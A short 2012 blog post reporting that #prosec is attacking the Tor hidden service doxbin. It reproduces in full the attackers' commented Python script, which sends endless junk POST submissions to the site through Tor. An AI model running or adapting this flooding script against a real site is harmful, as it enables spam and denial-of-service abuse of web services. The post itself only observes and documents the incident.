---
comments: true
date: "2012-04-11T18:42:43Z"
tags:
- nerdwar
- infosec
- prosec
- doxbin
title: '#Prosec Attacks on Doxbin'
---

Looks like #prosec is [nerdraging][1] on [@doxbin][2]. The effects can be seen
[here][3]. The attack I noticed first was a semi-lame HTTP POST attack that
floods doxbin with garbage "dox". Code here:

```python
#!/usr/bin/python

import socks
#google it, it's a common python extension
import socket
#127.0.0.1:9050 is the default TOR socks4 proxy
#this connects to TOR
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, "127.0.0.1", 9050)
socket.socket = socks.socksocket
from httplib import *
from urllib import *
import random
import time
import hashlib

times = 1
while 1:
	############DOX############
	doxrand = random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')
	dox = hashlib.sha224(doxrand).hexdigest()
	print dox
	#doxrand = picking a random character
	#dox = SHA hashing of the random character defined in doxrand
	##############NAEM###########
	naemrand = random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')
	naem = hashlib.sha224(naemrand).hexdigest()
	print naem
	#same as above
	##############

	connection = HTTPConnection("doxbinumfxfyytnh.onion")
	#establishing HTTP conenction to website
	head = {"Content-Type" : "application/x-www-form-urlencoded", "Accept" : "text/plain"}
	#constructing the header, so the webserver will respond properly
	parameters = urlencode({"naem" : naem, "dox" : dox})
	#defining the data to be used during POST, note naem and dox refer to the random strings from ealier
	#they must correspond to the ID fields from the web form, otherwise..it won't work
	connection.request("POST", "/post.php", parameters, head)
	#pushing the data to the post function of the php file
	print 'Connection OK...Continuing..'
	print 'Spammed', 
	print times, 
	print 'times!'
	times = times + 1
	time.sleep(30) #in seconds
	#self explanitory
```

Now, however, it looks like there are 403 Forbidden errors. I'm thinking Nachash
will get things running again soon.


[1]: http://pastebin.com/eVpCrD47
[2]: http://twitter.com/#!/doxbin
[3]: https://doxbinumfxfyytnh.tor2web.org/
